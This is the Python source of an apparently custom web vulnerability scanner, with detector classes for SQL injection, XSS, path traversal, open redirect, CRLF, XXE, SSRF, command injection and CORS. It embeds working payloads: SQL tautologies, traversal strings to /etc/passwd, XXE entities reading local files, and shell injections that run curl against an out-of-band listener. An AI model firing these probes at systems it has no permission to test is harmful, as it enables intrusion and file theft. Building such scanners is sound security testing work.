"""Phase 7: Scan Planner + Phase 8: Detection Framework.
Deterministic, rule-based planner: parameter kind -> candidate vulnerability classes.
Every Detector implements the contract: prepare/mutate/execute/analyze/verify.
"""
from __future__ import annotations
import re, urllib.parse
from .core import (Endpoint, EventBus, Finding, FindingStatus, ParamKind, Severity,
                   Evidence, Verification, Parameter, ParamLocation)
from .http_engine import USER_AGENT, RequestEngine, RequestMutation


def is_self_callback(hit: dict | None, resp, oast_url: str) -> bool:
    """ENG-08 (live-caught by the v2.5.0 SSRF detector on fixture /vuln/redirect.php):
    the request engine follows SAME-HOST redirects (required for auth landings and
    crawl depth) — an open-redirect target bounces our OAST probe URL back at the
    listener and the ENGINE ITSELF performs the fetch. That callback is scanner-
    initiated, never target-side evidence. Two independent markers: (a) the hop is
    recorded in THIS response's redirect_chain, (b) the fetcher's User-Agent is the
    engine's own. Either marker disqualifies the hit — OOB evidence must come from
    the TARGET's process, not ours."""
    if resp is not None:
        for h in (getattr(resp, "redirect_chain", None) or []):
            loc = h[1] if isinstance(h, (tuple, list)) and len(h) > 1 else str(h)
            if loc == oast_url:
                return True
    h0 = hit[0] if isinstance(hit, list) and hit else (hit if isinstance(hit, dict) else None)
    ua = (h0 or {}).get("ua", "")
    return bool(ua) and ua == USER_AGENT

# ------------------------------------------------------------ Planner rules
PLANNER_RULES = [
    (ParamKind.NUMERIC,   ["sql_injection"]),
    (ParamKind.IDENTIFIER,["sql_injection", "idor", "header_injection"]),
    (ParamKind.SEARCH,    ["sql_injection", "xss_reflected", "header_injection"]),
    (ParamKind.URL,       ["open_redirect", "ssrf"]),
    (ParamKind.FILENAME,  ["path_traversal"]),
    (ParamKind.HTML,      ["xss_reflected", "header_injection"]),
    (ParamKind.GENERIC,   ["sql_injection", "xss_reflected", "header_injection"]),
]

def plan_for(ep: Endpoint) -> list[dict]:
    """Deterministic scan plan: (param, vuln_class) pairs."""
    plan = []
    for p in ep.parameters:
        for kind, classes in PLANNER_RULES:
            if p.kind.value == kind.value:
                for c in classes:
                    plan.append({"endpoint": ep, "param": p, "vuln": c})
                break
    return plan


# ------------------------------------------------------------ Detector contract
class Detector:
    name = "base"
    vuln_type = ""
    severity = Severity.MEDIUM
    timeout_hint: float | None = None

    def __init__(self, engine: RequestEngine, bus: EventBus, strategy_store=None):
        self.engine, self.bus, self.strategies = engine, bus, strategy_store

    def candidates(self, ep: Endpoint) -> list[RequestMutation]:
        raise NotImplementedError

    def analyze(self, m: RequestMutation, resp) -> Finding | None:
        raise NotImplementedError


SQL_ERR_PATTERNS = [
    re.compile(r"Microsoft OLE DB Provider", re.I),
    re.compile(r"\[Microsoft\]\[ODBC", re.I),
    re.compile(r"Unclosed quotation mark", re.I),
    re.compile(r"you have an error in your sql syntax", re.I),
    re.compile(r"sqlite3?\.(OperationalError|ProgrammingError)", re.I),
    re.compile(r"Warning: mysql_", re.I),
    re.compile(r"PostgreSQL.*ERROR", re.I),
]


class SQLiDetector(Detector):
    """Error-based + boolean-blind oracle. Strategies ordered by verified stats (Phase 19)."""
    name, vuln_type = "sqli", "sql_injection"
    severity = Severity.CRITICAL

    STRATEGIES = {
        "quote_error":   ["'", "''"],                      # syntax break -> 500/error string
        "boolean_and":   ["AND 1=1", "AND 1=2"],           # oracle pair
        "error_or":      ["' OR '1'='1"],
    }

    def candidates(self, ep: Endpoint):
        out = []
        for p in ep.parameters:
            if p.kind == ParamKind.TOKEN:
                continue          # Phase 50: CSRF tokens ride along verbatim, never mutated
            base = p.value if p.value.isdigit() else "1"
            # DETECT-04 (live-caught on ginandjuice.shop /catalog?category=): quote ->
            # HTTP 500 with a GENERIC error page (no SQL keywords anywhere) — the old
            # error-pattern check alone missed it. base + doubled-quote are the paired
            # controls: base must be OK, and a VALID SQL string ('') must be OK too.
            out.append(("base",        RequestMutation(endpoint=ep, param_name=p.name, param_value=base)))
            out.append(("pair_quote",  RequestMutation(endpoint=ep, param_name=p.name, param_value=base + "''")))
            out.append(("quote_error", RequestMutation(endpoint=ep, param_name=p.name, param_value=base + "'")))
            out.append(("boolean_true",  RequestMutation(endpoint=ep, param_name=p.name, param_value=f"{base} AND 1=1")))
            out.append(("boolean_false", RequestMutation(endpoint=ep, param_name=p.name, param_value=f"{base} AND 1=2")))
            # DETECT-01 (live-proven on demo.testfire.net/doLogin): string-context OR-tautology
            # pair with trailing comment — fires on login/auth endpoints where the numeric
            # AND-pair cannot (values quoted as strings in SQL).
            out.append(("or_true",  RequestMutation(endpoint=ep, param_name=p.name, param_value=f"{base}' OR '1'='1' -- ")))
            out.append(("or_false", RequestMutation(endpoint=ep, param_name=p.name, param_value=f"{base}' OR '1'='2' -- ")))
        return out

    def analyze(self, pair, resp_map) -> Finding | None:
        """pair = (endpoint, param). resp_map: strategy->Response."""
        ep, p = pair
        ev = []
        # 1) error-based
        r = resp_map.get("quote_error")
        if r is not None and r.status and not r.ok:
            body = r.body or ""
            for pat in SQL_ERR_PATTERNS:
                mm = pat.search(body)
                if mm:
                    ev.append(Evidence("db_error", f"{pat.pattern[:40]} matched: {mm.group(0)[:80]}", r.request_id))
                    break
        # 1b) DETECT-04 — status oracle: quote breaks the server (5xx) while the base
        # value AND a syntactically-valid doubled quote both succeed. A 5xx-on-quote
        # alone is weak (apps crash on odd input); the paired controls make it a
        # SQL-shaped signal. 4xx is deliberately EXCLUDED — ginandjuice ?productId=1'
        # returns 400 "Invalid product ID" from input VALIDATION, not SQL (live-proven
        # false lead: flagging it would have been a false positive).
        rq, rb, rp = resp_map.get("quote_error"), resp_map.get("base"), resp_map.get("pair_quote")
        if (rq is not None and rb is not None and rp is not None and
                rq.status >= 500 and rb.ok and rp.ok):
            ev.append(Evidence("status_oracle",
                f"quote -> HTTP {rq.status} (generic error, no DB string) while base -> {rb.status} "
                f"and doubled-quote -> {rp.status} — SQL syntax break", rq.request_id))
        # 2) boolean oracle (status differential, 200 vs 500) — the proven real-world oracle
        rt, rf = resp_map.get("boolean_true"), resp_map.get("boolean_false")
        oracle = False
        if rt is not None and rf is not None and rt.status and rf.status:
            if rt.ok and not rf.ok:
                oracle = True
                ev.append(Evidence("response_diff",
                    f"TRUE probe -> HTTP {rt.status} ({len(rt.body)}B), FALSE probe -> HTTP {rf.status} ({len(rf.body)}B) — boolean oracle", rt.request_id))
            elif abs(len(rt.body or "") - len(rf.body or "")) > max(200, 0.25 * max(len(rt.body or "x"), 1)):
                oracle = True
                ev.append(Evidence("response_diff",
                    f"body-size differential {len(rt.body)}B vs {len(rf.body)}B on condition flip", rt.request_id))
        # 3) DETECT-01 — OR-tautology redirect differential (auth-bypass oracle, string context)
        # ENG-01: hop_location() reads the FIRST-HOP target even when the engine
        # auto-follows the redirect (old code saw only the final 200 — oracle destroyed).
        ot, of = resp_map.get("or_true"), resp_map.get("or_false")
        if ot is not None and of is not None and ot.status and of.status:
            lt, lf = ot.hop_location(), of.hop_location()
            if lt and lf and lt != lf:
                oracle = True
                ev.append(Evidence("redirect_diff",
                    f"OR-tautology redirect differential: TRUE -> {lt}, FALSE -> {lf} — auth-bypass oracle",
                    ot.request_id))
            # 3b) DETECT-05 (live-caught on ginandjuice.shop /catalog?category=): the
            # string-context OR pair must ALSO check the body-size differential — the
            # redirect oracle only exists on auth flows; on data endpoints the tautology
            # changes the RESULT SET SIZE instead (TRUE -> all products 17KB, FALSE ->
            # empty category 9.4KB). The AND-pair already had this check; the OR pair
            # (the only one that works in string contexts) did not.
            elif ot.ok and of.ok and ot.status == of.status:
                bt, bf = len(ot.body or ""), len(of.body or "")
                if abs(bt - bf) > max(200, 0.25 * max(bt, bf, 1)):
                    oracle = True
                    ev.append(Evidence("response_diff",
                        f"OR-pair body-size differential on condition flip: TRUE {bt}B vs FALSE {bf}B "
                        f"(string-context boolean oracle)", ot.request_id))
        if not ev:
            return None
        return Finding(type="sql_injection", severity=self.severity, endpoint_url=ep.url,
                       parameter=p.name, method=ep.method, evidence=ev, status=FindingStatus.CANDIDATE)


class XSSDetector(Detector):
    name, vuln_type = "xss", "xss_reflected"
    severity = Severity.HIGH
    CANARY = "sentinelxssmarker"

    def candidates(self, ep: Endpoint):
        out = []
        for p in ep.parameters:
            if p.kind == ParamKind.TOKEN:
                continue          # Phase 50: mutating a CSRF token only breaks the flow
            # VR-03 (live-caught on ginandjuice.shop /catalog?category=): the full-tag
            # canary carries a closing tag </sentinelxssmarker> — apps that escape only
            # the '/' (e.g. </ -> <\/ as JS-string hardening) break the needle match
            # even though < and > pass RAW (real reflection: const x = "Gin<svg onload=..>").
            # Slash-free variant detects the unescaped-markup weakness independently.
            out.append(("full_tag", RequestMutation(endpoint=ep, param_name=p.name,
                    param_value=f"<{self.CANARY}>pro41</{self.CANARY}>")))
            out.append(("slash_free", RequestMutation(endpoint=ep, param_name=p.name,
                    param_value=f"<{self.CANARY}pro42")))
        return out

    def analyze(self, pair, resp):
        ep, p = pair
        if resp is None or not resp.body: return None
        # DETECT-10 (live-proven on ginandjuice.shop /catalog/subscribe): the email
        # param reflects RAW inside an application/json response — but a JSON body is
        # parsed as data by the browser, never as markup. Flagging it would be a
        # FALSE POSITIVE; the real verdict belongs to the browser submit-flow (does
        # the client render the response value into an HTML sink?). Only HTML-ish
        # (or unspecified) response types are candidate XSS reflections here.
        ct = (resp.headers or {}).get("content-type", "")
        if "json" in ct.lower() and "html" not in ct.lower():
            return None
        for needle in (f"<{self.CANARY}>pro41</{self.CANARY}>", f"<{self.CANARY}pro42"):
            if needle in resp.body:
                i = resp.body.find(needle)
                ctx = resp.body[max(0, i - 60):i + len(needle) + 30].replace("\n", " ")
                return Finding("xss_reflected", Severity.HIGH, ep.url, p.name, ep.method,
                           [Evidence("unescaped_reflection", f"canary reflected raw in context: …{ctx}…", resp.request_id)],
                           status=FindingStatus.CANDIDATE)
        return None


class TraversalDetector(Detector):
    name, vuln_type = "traversal", "path_traversal"
    severity = Severity.HIGH
    MARKERS = [("[fonts]", "win.ini"), ("[boot loader]", "boot.ini"), ("root:x:0:0:", "/etc/passwd"),
               ("SENTINEL-SECRET-FILE", "fixture secret file")]

    def candidates(self, ep: Endpoint):
        payloads = []
        for depth in (4, 6, 8):
            payloads.append("../" * depth + "windows/win.ini")
            payloads.append("../" * depth + "etc/passwd")
        payloads.append("....//....//....//windows/win.ini")
        return [(pl, RequestMutation(endpoint=ep, param_name=p.name, param_value=pl))
                for p in ep.parameters if p.kind != ParamKind.TOKEN
                for pl in payloads[:4]]

    def analyze(self, pair, resp):
        ep, p = pair
        if resp is None or not resp.body: return None
        for marker, fname in self.MARKERS:
            if marker in resp.body:
                i = resp.body.find(marker)
                return Finding("path_traversal", Severity.HIGH, ep.url, p.name, ep.method,
                               [Evidence("file_marker", f"content of {fname} leaked (marker {marker!r} at offset {i})",
                                         resp.request_id, resp.body[i:i + 200])],
                               status=FindingStatus.CANDIDATE)
        return None


class RedirectDetector(Detector):
    name, vuln_type = "redirect", "open_redirect"
    severity = Severity.MEDIUM

    def candidates(self, ep: Endpoint):
        ev = "sentinel-redirect-check.example.org"
        return [(v, RequestMutation(endpoint=ep, param_name=p.name, param_value=v))
                for p in ep.parameters if p.kind != ParamKind.TOKEN
                for v in (f"https://{ev}/probe", f"//{ev}/probe")]

    def analyze(self, pair, resp):
        ep, p = pair
        if resp is None: return None
        loc = resp.hop_location()   # ENG-01: chain-aware (same-host followed redirects included)
        if loc and "sentinel-redirect-check.example.org" in loc:
            return Finding("open_redirect", Severity.MEDIUM, ep.url, p.name, ep.method,
                           [Evidence("header_value", f"Location redirects off-site to {loc[:100]}", resp.request_id)],
                           status=FindingStatus.CANDIDATE)
        # reflected/meta/JS redirect context
        if resp.body and ("sentinel-redirect-check.example.org" in resp.body and
                          re.search(r"(location\.href|window\.location|http\.refresh|meta[^>]+refresh)", resp.body, re.I)):
            return Finding("open_redirect", Severity.MEDIUM, ep.url, p.name, ep.method,
                           [Evidence("body_redirect", "off-site URL injected into client redirect sink", resp.request_id)],
                           status=FindingStatus.CANDIDATE)
        return None


class CrlfDetector(Detector):
    """DETECT-07 (live-caught on ginandjuice.shop /catalog?category=): response header
    injection. The category value flows into `Set-Cookie: category=<value>` WITHOUT
    CRLF sanitization — %0d%0a in the param splits a second attacker-controlled header
    (verified live: x-sentinel-probe appeared in real response headers). Detection:
    inject a CRLF + uniquely-named probe header; if the server emits it, header
    injection is proven. Enables cookie injection, CSP/Cache-Control override, session
    fixation. Numeric params are skipped (never header-reflected in practice)."""
    name, vuln_type = "crlf", "http_response_header_injection"
    severity = Severity.HIGH
    PROBE_VALUE = "sentinelcrlf\r\nX-Sentinel-Probe: injected"
    PROBE_HEADER = "x-sentinel-probe"

    def candidates(self, ep: Endpoint):
        return [RequestMutation(endpoint=ep, param_name=p.name, param_value=self.PROBE_VALUE)
                for p in ep.parameters if p.kind not in (ParamKind.NUMERIC, ParamKind.TOKEN)]

    def analyze(self, pair, resp):
        ep, p = pair
        if resp is None or not resp.headers: return None
        v = resp.headers.get(self.PROBE_HEADER, "")
        if v:
            return Finding("http_response_header_injection", Severity.HIGH, ep.url, p.name, ep.method,
                [Evidence("header_value",
                          f"CRLF in param split a second response header: {self.PROBE_HEADER}: {v[:80]!r} "
                          f"(attacker-controlled header injection)", resp.request_id)],
                status=FindingStatus.CANDIDATE)
        return None


class XxeDetector(Detector):
    """DETECT-08 (live-caught on ginandjuice.shop /catalog/product/stock): XML external
    entity injection on endpoints whose REAL request shape is built by JavaScript
    (form data is wrapped into <stockCheck> XML with Content-Type application/xml —
    xmlStockCheckPayload.js). DISC-06 learns the XML root from that JS statically; this
    detector then replays the transformation with external entities. No browser needed.

    Live-proven oracle: entity-resolved file content changes the response body
    (/etc/hostname -> 648, /etc/passwd -> 295, nonexistent -> 23); unreadable files
    (/etc/shadow) equal the nonexistent control — true file-read semantics.

    BLIND-XXE LIMIT (live-proven on ginandjuice.shop itself): when the response is
    independent of entity content (random stock numbers per request — same file gave
    23/768/52/191/52 across five probes), NO response-based oracle exists. The double-
    control stability check (control probed twice, must match) rejects such noise at
    detection time; blind XXE needs OOB/Collaborator confirmation (documented future
    phase — parameter entities are blocked there, so even error-based tricks fail).

    Two-phase probe: recon XML (form params only) reveals expected-but-missing
    elements from the app's own error text ("Store ID could not be parsed" -> storeId);
    then a 4-probe differential (control x2 vs /etc/hostname vs /etc/passwd)."""
    name, vuln_type = "xxe", "xxe"
    severity = Severity.CRITICAL
    ENTITY = "sentinelxxe"
    FILES = ["file:///etc/hostname", "file:///etc/passwd"]
    CONTROL = "file:///nonexistent-sentinel-control"

    def _xml(self, root, fields: list, entity_file=None, entity_target=None):
        ents = (f'<!DOCTYPE {root} [<!ENTITY {self.ENTITY} SYSTEM "{entity_file}">]>'
                if entity_file else "")
        body = "".join(f"<{k}>{v}</{k}>" for k, v in fields)
        if entity_target is not None:
            body += f"<{entity_target}>&{self.ENTITY};</{entity_target}>"
        return f'<?xml version="1.0" encoding="UTF-8"?>{ents}<{root}>{body}</{root}>'

    def _mutation(self, ep, xml):
        return RequestMutation(endpoint=ep, body_override=xml, method="POST",
                               extra_headers={"Content-Type": "application/xml"})

    def candidates(self, ep: Endpoint):
        # Only POST endpoints with form params are candidates for XML replay, and only
        # when the crawl statically learned an XML transformation from JS (DISC-06).
        if (ep.method or "GET").upper() != "POST" or not ep.parameters:
            return []
        from .discovery import JS_XML_HINTS
        roots = sorted(JS_XML_HINTS)
        if not roots:
            return []                       # no JS-learned XML transform: skip (request economy)
        fields = [(p.name, p.value or "1") for p in ep.parameters]
        return [(f"recon|{root}", self._mutation(ep, self._xml(root, fields)))
                for root in roots]

    def expand(self, ep, recon_resp, root):
        """Phase 2 — build the entity differential probes from the recon response."""
        fields = [(p.name, p.value or "1") for p in ep.parameters]
        targets = [p.name for p in ep.parameters]
        body = (recon_resp.body or "") if recon_resp else ""
        # Error-driven element discovery: "Store ID could not be parsed" -> storeId
        for m in re.finditer(r"([A-Za-z][a-z]{1,20}) ID could not be parsed", body):
            word = m.group(1)
            cand = word[0].lower() + word[1:] + "Id"
            if cand and cand not in targets:
                targets.append(cand)
        probes = []
        for t in targets[:4]:
            # control TWICE: response-determinism gate (blind-XXE targets answer with
            # per-request random values — an unstable control proves the response carries
            # no entity-content information, so the differential is meaningless noise).
            probes.append((f"control|{root}|{t}", self._mutation(ep, self._xml(root, fields, self.CONTROL, t))))
            probes.append((f"control2|{root}|{t}", self._mutation(ep, self._xml(root, fields, self.CONTROL, t))))
            for f in self.FILES:
                probes.append((f"probe|{root}|{t}|{f}", self._mutation(ep, self._xml(root, fields, f, t))))
        return probes

    def analyze(self, pair, resp_map) -> Finding | None:
        ep, _ = pair
        by_elem: dict = {}
        for key, r in resp_map.items():
            parts = key.split("|")
            if parts[0] == "probe":
                by_elem.setdefault(parts[2], {})[parts[3]] = r
            elif parts[0] in ("control", "control2"):
                by_elem.setdefault(parts[2], {})[parts[0]] = r
        for elem, m in by_elem.items():
            ctrl, ctrl2 = m.get("control"), m.get("control2")
            if ctrl is None or ctrl2 is None or len(m) < 4:
                continue
            # stability gate: same control payload twice must produce the SAME response
            if ctrl.status != ctrl2.status or (ctrl.body or "") != (ctrl2.body or ""):
                continue
            diffs = []
            for f, r in m.items():
                if f in ("control", "control2"):
                    continue
                if r.status != ctrl.status or (r.body or "") != (ctrl.body or ""):
                    diffs.append(f"{f.rsplit('/', 1)[-1]}: entity -> {r.status} {(r.body or '')[:30]!r} "
                                 f"vs control {ctrl.status} {(ctrl.body or '')[:30]!r}")
            # both fresh files must differ from control (2 independent confirmations)
            if len(diffs) >= 2:
                root = next((k.split("|")[1] for k in resp_map if k.startswith("probe|")), "?")
                return Finding("xxe", Severity.CRITICAL, ep.url, elem, "POST",
                    [Evidence("entity_differential",
                              f"external entity resolution confirmed via response differential — {'; '.join(diffs[:3])}. "
                              f"recipe: root={root} element={elem}",
                              ctrl.request_id)],
                    status=FindingStatus.CANDIDATE)
        return None

    # ------------------------------------------------------------ OOB (Phase 49)
    def _oob_iid(self, ep, elem: str, tag: str) -> str:
        """Deterministic interaction id: same endpoint+element+tag -> same id across
        runs (evidence stays reproducible; the listener port never leaks into it)."""
        import hashlib
        return "oob-" + hashlib.sha1(f"{ep.url}|{elem}|{tag}".encode()).hexdigest()[:12]

    def _elements_for(self, ep, recon_body: str) -> list[str]:
        """Element targeting for the OOB path: error-discovered elements FIRST (the
        app's own error names the real content target — live-proven on ginandjuice:
        'Store ID could not be parsed' -> storeId), then form params as fallback."""
        params = [p.name for p in ep.parameters]
        discovered = []
        for m in re.finditer(r"([A-Za-z][a-z]{1,20}) ID could not be parsed", recon_body or ""):
            word = m.group(1)
            cand = word[0].lower() + word[1:] + "Id"
            if cand not in discovered:
                discovered.append(cand)
        return discovered + [p for p in params if p not in discovered]

    def oob_attempt(self, ep, root: str, recon_resp, oast) -> Finding | None:
        """BLIND-XXE path (live-proven necessity on ginandjuice.shop stock): when the
        response carries NO entity-content information (stability gate failed above),
        the only evidence channel is an OUT-OF-BAND fetch. Send an external entity
        pointing at our OAST listener; a callback proves server-side entity
        resolution — response-independent, so it works exactly where the response
        oracle cannot. Request economy: first 2 elements only, one probe each."""
        elements = self._elements_for(ep, (recon_resp.body or "") if recon_resp else "")[:2]
        for elem in elements:
            iid = self._oob_iid(ep, elem, "detect")
            fields = [(p.name, p.value or "1") for p in ep.parameters]
            xml = self._xml(root, fields, oast.url(iid), elem)
            m = self._mutation(ep, xml)
            r = self.engine.send(m)
            if r.error:
                continue
            hit = oast.poll(iid, timeout=2.0)
            if hit:
                if is_self_callback(hit, r, oast.url(iid)):
                    continue                    # ENG-08: scanner-initiated fetch, not the target
                h = hit[0]
                # Phase 52: source attribution — the callback's origin IP + UA make
                # the evidence self-contained (live case: ginandjuice.shop fetched
                # its entity from 54.170.155.72 with UA "ginandjuice.shop; ...").
                src = h.get("ip") or h.get("host") or "unknown"
                ua = (h.get("ua") or "")[:60]
                src_txt = f" from {src}" + (f" (ua={ua})" if ua else "")
                return Finding("xxe", Severity.CRITICAL, ep.url, elem, "POST",
                    [Evidence("oob_callback",
                              f"target fetched the external entity out-of-band{src_txt} "
                              f"(interaction {iid} via {h.get('method', 'GET')} at t+{h.get('t', 0):.0f}) — "
                              f"blind XXE: entity resolution proven with NO response oracle. "
                              f"recipe: root={root} element={elem} iid={iid}",
                              r.request_id)],
                    status=FindingStatus.CANDIDATE)
        return None


# ------------------------------------------------------------ DETECT-11/12 (Phase 53): OAST-channel classes
class SsrfDetector(Detector):
    """DETECT-11 (SSRF, server-side request forgery): params whose name or value
    marks them as URL carriers are pointed at the OAST channel — if the SERVER
    (not the client) fetches our URL, the callback is out-of-band proof of a
    server-side fetch. This is the exact evidence pattern live-proven for blind
    XXE on ginandjuice.shop (v2.4.0): response-independent confirmation.
    Gated on an armed OAST channel (needs_oast) — without one the detector is
    inert (response-only SSRF oracles are unreliable: a 200/latency differential
    is ambient noise on real apps, live-observed on the noise-cycling stock
    endpoint). Request economy: name/value-gated params only, hard probe cap."""
    name, vuln_type = "ssrf", "ssrf"
    severity = Severity.HIGH
    needs_oast = True
    URL_NAMES = {"url", "uri", "link", "href", "page", "redirect", "dest", "destination",
                 "next", "target", "src", "source", "fetch", "callback", "return",
                 "returnto", "continue", "domain", "site", "load", "data", "reference",
                 "proxy", "feed", "open", "window", "image", "img", "out", "nav", "go", "u"}
    MAX_PROBES = 12                     # deterministic budget (endpoint order is deterministic)
    POLL_LOCAL = 0.15                   # local callbacks land synchronously, before the probe response

    def __init__(self, engine, bus, strategy_store=None, oast=None):
        super().__init__(engine, bus, strategy_store)
        self.oast = oast
        self._probes = 0

    def _iid(self, ep, param: str, tag: str) -> str:
        import hashlib
        return "oob-" + hashlib.sha1(f"ssrf|{ep.url}|{param}|{tag}".encode()).hexdigest()[:12]

    def candidates(self, ep: Endpoint):
        if self.oast is None or self._probes >= self.MAX_PROBES:
            return []
        out = []
        for p in ep.parameters:
            if p.kind in (ParamKind.TOKEN, ParamKind.NUMERIC):
                continue
            val = (p.value or "").lower()
            urlish = p.name.lower() in self.URL_NAMES or val.startswith(("http://", "https://", "//"))
            if not urlish:
                continue
            iid = self._iid(ep, p.name, "detect")
            out.append(RequestMutation(endpoint=ep, param_name=p.name,
                                       param_value=self.oast.url(iid), note=f"ssrf:{iid}"))
            self._probes += 1
            if self._probes >= self.MAX_PROBES:
                break
        return out

    def analyze(self, pair, resp):
        ep, p = pair
        if p is None or self.oast is None:
            return None
        iid = self._iid(ep, p.name, "detect")
        hit = self.oast.poll(iid, timeout=(3.0 if getattr(self.oast, "channel", "") == "public-webhook" else self.POLL_LOCAL))
        if hit:
            if is_self_callback(hit, resp, self.oast.url(iid)):
                return None                      # ENG-08: the scanner fetched it itself
            h = hit[0]
            src = h.get("ip") or "unknown"
            ua = (h.get("ua") or "")[:60]
            return Finding("ssrf", Severity.HIGH, ep.url, p.name, ep.method,
                [Evidence("oob_callback",
                          f"server fetched the attacker-supplied URL out-of-band from {src}"
                          + (f" (ua={ua})" if ua else "") +
                          f" (interaction {iid} via {h.get('method', 'GET')}) — SSRF: the "
                          f"application made the request itself. recipe: param={p.name} iid={iid}",
                          resp.request_id)],
                status=FindingStatus.CANDIDATE)
        return None


class CommandInjectionDetector(Detector):
    """DETECT-12 (blind OS command injection): shell-metacharacter variants that
    make the server fetch our OAST URL. A callback proves code LEFT the app's
    shell — the strongest execution evidence short of response output, and the
    ONLY reliable one when command output never reaches the response (blind).
    Lives on the OAST channel like DETECT-11; inert without one. Budget: first
    MAX_PARAMS mutable params per scan, a 2-variant separator battery per param
    (both variants share one interaction id — the battery narrows the trigger
    context, the id stays single so polling stays cheap)."""
    name, vuln_type = "cmdi", "command_injection"
    severity = Severity.CRITICAL
    needs_oast = True
    MAX_PARAMS = 24                     # deterministic budget (mutable params precede the
                                         # target surface in endpoint order — sized so the
                                         # whole fixture surface stays within the budget)
    VARIANTS = ["; curl -s {u} ;", "&& curl -s {u}"]      # separator battery
    VERIFY_TEMPLATE = "| curl -s {u}"    # VR-11: DIFFERENT syntax + fresh id
    POLL_LOCAL = 0.15                   # local callbacks land synchronously

    def __init__(self, engine, bus, strategy_store=None, oast=None):
        super().__init__(engine, bus, strategy_store)
        self.oast = oast
        self._probes = 0

    def _iid(self, ep, param: str, tag: str) -> str:
        import hashlib
        return "oob-" + hashlib.sha1(f"cmdi|{ep.url}|{param}|{tag}".encode()).hexdigest()[:12]

    def candidates(self, ep: Endpoint):
        if self.oast is None or self._probes >= self.MAX_PARAMS:
            return []
        out = []
        for p in ep.parameters:
            if p.kind in (ParamKind.TOKEN, ParamKind.NUMERIC) or not p.name:
                continue
            base = p.value or "localhost"
            if len(base) > 60:
                base = base[:60]
            iid = self._iid(ep, p.name, "detect")
            for v in self.VARIANTS:
                out.append(RequestMutation(endpoint=ep, param_name=p.name,
                                           param_value=base + v.format(u=self.oast.url(iid)),
                                           note=f"cmdi:{iid}"))
            self._probes += 1
            if self._probes >= self.MAX_PARAMS:
                break
        return out

    def analyze(self, pair, resp):
        ep, p = pair
        if p is None or self.oast is None:
            return None
        iid = self._iid(ep, p.name, "detect")
        hit = self.oast.poll(iid, timeout=(3.0 if getattr(self.oast, "channel", "") == "public-webhook" else self.POLL_LOCAL))
        if hit:
            if is_self_callback(hit, resp, self.oast.url(iid)):
                return None                      # ENG-08: the scanner fetched it itself
            h = hit[0]
            src = h.get("ip") or "unknown"
            return Finding("command_injection", Severity.CRITICAL, ep.url, p.name, ep.method,
                [Evidence("oob_callback",
                          f"server executed a shell fetch out-of-band from {src} "
                          f"(interaction {iid}) — blind command injection: separator "
                          f"battery ([';', '&&']) triggered an outbound curl. "
                          f"recipe: param={p.name} iid={iid}",
                          resp.request_id)],
                status=FindingStatus.CANDIDATE)
        return None


class CorsDetector(Detector):
    """DETECT-13 (CORS misconfiguration): send a cross-origin probe header; if the
    server REFLECTS an arbitrary Origin in Access-Control-Allow-Origin WHILE
    also allowing credentials, any origin can read authenticated responses —
    the dangerous combination (ACAO:* without credentials is NOT reportable:
    no credentialed access, live doctrine: zero false positives). Header-only
    probe: one request per GET endpoint, no params needed (runs via run(ep)
    — the generic loop is param-bound). Verification (VR-10) replays with a
    FRESH origin value: reflection must repeat to be a finding."""
    name, vuln_type = "cors", "cors_misconfig"
    severity = Severity.HIGH
    PROBE_ORIGIN = "https://sentinel-probe.example"
    SKIP_EXT = (".css", ".js", ".png", ".jpg", ".jpeg", ".svg", ".gif", ".ico", ".woff", ".woff2", ".map")

    def candidates(self, ep: Endpoint):          # not used — see run(ep)
        return []

    def run(self, ep: Endpoint) -> Finding | None:
        if (ep.method or "GET").upper() != "GET":
            return None
        if ep.url.split("?")[0].lower().endswith(self.SKIP_EXT):
            return None
        r = self.engine.send(RequestMutation(endpoint=ep, note="cors-probe",
                                             extra_headers={"Origin": self.PROBE_ORIGIN}))
        if r is None or r.error:
            return None
        acao = (r.headers or {}).get("access-control-allow-origin", "")
        acac = (r.headers or {}).get("access-control-allow-credentials", "")
        if self.PROBE_ORIGIN in acao and acac.strip().lower() == "true":
            return Finding("cors_misconfig", Severity.HIGH, ep.url, "Origin", "GET",
                [Evidence("header_reflection",
                          f"arbitrary Origin reflected WITH credentials: "
                          f"Access-Control-Allow-Origin: {acao[:80]} + "
                          f"Access-Control-Allow-Credentials: true — credentialed "
                          f"cross-origin reads from ANY origin", r.request_id)],
                status=FindingStatus.CANDIDATE)
        return None



SECURITY_HEADERS = ["strict-transport-security", "content-security-policy", "x-frame-options",
                    "x-content-type-options", "referrer-policy"]

def passive_audit(ep: Endpoint, resp) -> list[Finding]:
    out = []
    if resp is None or not resp.status: return out
    missing = [h for h in SECURITY_HEADERS if h not in resp.headers]
    if missing:
        out.append(Finding("missing_security_headers", Severity.LOW, ep.url, "", ep.method,
                    [Evidence("header_absent", f"missing: {', '.join(missing)}", resp.request_id)],
                    status=FindingStatus.CANDIDATE))
    srv = resp.headers.get("server", "")
    if srv and re.search(r"[0-9]+\.[0-9]+", srv):
        out.append(Finding("server_banner_disclosure", Severity.LOW, ep.url, "", ep.method,
                    [Evidence("header_value", f"Server: {srv}", resp.request_id)],
                    status=FindingStatus.CANDIDATE))
    powered = resp.headers.get("x-powered-by", "")
    if powered:
        out.append(Finding("tech_banner_disclosure", Severity.LOW, ep.url, "", ep.method,
                    [Evidence("header_value", f"X-Powered-By: {powered}", resp.request_id)],
                    status=FindingStatus.CANDIDATE))
    # PASSIVE-02 (live-caught on ginandjuice.shop): vulnerable JS dependency detection —
    # PortSwigger's scanme serves angular_1-7-7.js and lists "Vulnerable JavaScript
    # dependency" in its own ground truth. Version-sniff the asset path.
    base = ep.url.rsplit("/", 1)[-1].lower()
    for pat, msg in VULN_JS_DEPS:
        if pat.search(base):
            out.append(Finding("vulnerable_js_dependency", Severity.LOW, ep.url, "", ep.method,
                        [Evidence("banner", f"served asset {base!r}: {msg}", resp.request_id)],
                        status=FindingStatus.CANDIDATE))
            break
    return out


# Known-vulnerable JS assets (extend as advisories accumulate; keep deterministic).
VULN_JS_DEPS = [
    (re.compile(r"angular[^/?]*[_.\-]?1[_.\-]?[0-9]"),
     "AngularJS 1.x — end-of-life branch (Jan 2022); sandbox-escape / client-side template injection class (CVE-2019-10768, CVE-2024-21490)"),
]


ACTIVE_DETECTORS = [SQLiDetector, XSSDetector, TraversalDetector, RedirectDetector, CrlfDetector,
                    XxeDetector, SsrfDetector, CommandInjectionDetector, CorsDetector]
